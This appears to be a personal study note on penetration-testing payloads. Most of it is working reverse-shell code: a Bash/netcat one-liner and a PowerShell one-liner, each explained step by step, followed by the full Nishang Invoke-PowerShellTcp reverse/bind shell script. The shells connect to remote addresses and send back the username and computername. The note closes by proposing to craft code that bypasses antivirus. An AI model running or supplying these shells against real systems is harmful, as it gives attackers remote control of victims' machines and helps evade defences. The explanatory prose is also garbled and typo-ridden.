# INTRODUCTION TO PAYLOADS

Example - we sent the email or text that was packet's payload as it send across the vast internaet.

In Computing payloads is intended message it can be a command or code that exploit the vulnerability is an OS or applications.

## One liner Examined

Netcat/Bash Reverse Shell One-liner

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

- **rm -f /tmp/f: This deletes the file /tmp/f if it exists. The -f flag forces deletion without prompting for confirmation.**

- **mkfifo /tmp/f: This creates a named pipe (FIFO) at /tmp/f. A FIFO (First In, First Out) is a special file type that can be used for inter-process communication, where one process writes to it and another reads from it.**

- **cat /tmp/f | /bin/bash -i 2>&1:**

- cat /tmp/f reads from the FIFO file /tmp/f and sends the output to the pipeline.

- /bin/bash -i starts an interactive Bash shell. The -i flag ensures that the shell behaves interactively, allowing the attacker to execute commands.

- 2>&1 redirects standard error (stderr, file descriptor 2) to standard output (stdout, file descriptor 1). This ensures that both error messages and normal output are captured and sent to the next part of the command.

- **| nc 10.10.14.12 7777:**

- nc stands for Netcat, a utility for network communication.

- This part connects to a remote server at IP 10.10.14.12 on port 7777. Netcat sends and receives data from this remote host.

- **> /tmp/f:**

- The output of the Netcat connection is written back into the FIFO /tmp/f, creating a feedback loop.

- Essentially, this means whatever is received from the attacker (via Netcat) gets fed back into the shell process.


## PowerShell One-liner Explained

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# PowerShell Reverse Shell Breakdown

This is a detailed explanation of each part of the PowerShell reverse shell script.

## Calling PowerShell
**`powershell -nop -c:`**
- **`-nop`**: This flag stands for "No Profile". It ensures that the PowerShell script does not load any profile scripts, making the process stealthier and faster.
- **`-c`**: This flag allows the execution of the following string as a command.

---

## Binding a Socket
**`$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443):`**
- Creates a new TCP client connection to the attacker's machine located at IP `10.10.14.158` on port `443`.
- This sets up the reverse shell connection to the attacker’s machine, allowing data to be sent and received.

---

## Setting the Command Stream
**`$stream = $client.GetStream():`**
- Gets the network stream to allow data transmission over the established TCP connection.

---

## Empty Byte Stream
**`[byte[]]$bytes = 0..65535|%{0}:`**
- Initializes a byte array `$bytes` with `65536` elements, all set to `0`. 
- This array will be used to store incoming data from the network stream.

---

## Stream Parameters
**`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0):`**
- A loop is initiated where data is continuously read from the stream into the `$bytes` array until no more data is available (i.e., the length of data read is 0).

---

## Set the Byte Encoding
**`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i):`**
- Converts the byte array `$bytes` into a string `$data` using ASCII encoding.
- The `$i` variable contains the number of bytes actually read from the stream.

---

## Invoke-Expression
**`$sendback = (iex $data 2>&1 | Out-String):`**
- The `iex` executes the received command `$data` in PowerShell.
- `2>&1` redirects both standard output and error output to the same stream.
- The output is then converted to a string using `Out-String`.

---

## Show Working Directory
**`$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ':`**
- The output of the executed command (`$sendback`) is appended with the current PowerShell prompt (`PS <current directory> > `) to indicate where the next command will be executed from.

---

## Sets Sendbyte
**`$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2):`**
- The response, including the new prompt, is converted back into a byte array (`$sendbyte`) using ASCII encoding.

---

## Send Data to Attacker
**`$stream.Write($sendbyte,0,$sendbyte.Length):`**
- Sends the byte array `$sendbyte` back to the attacker through the network stream.

---

## Flush the Stream
**`$stream.Flush():`**
- Ensures that all data is written to the network stream, sending it to the attacker’s machine.

---

## Terminate TCP Connection
**`$client.Close():`**
- Closes the TCP client connection after the reverse shell session ends.
 

we can write above in .ps1 format alsi

```
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```


### Payloads take tifferent shape and Forms

we can uderstand by these why AV is blocking request then analysisng it we can get some idea and craft the code to bypass the restriction. 
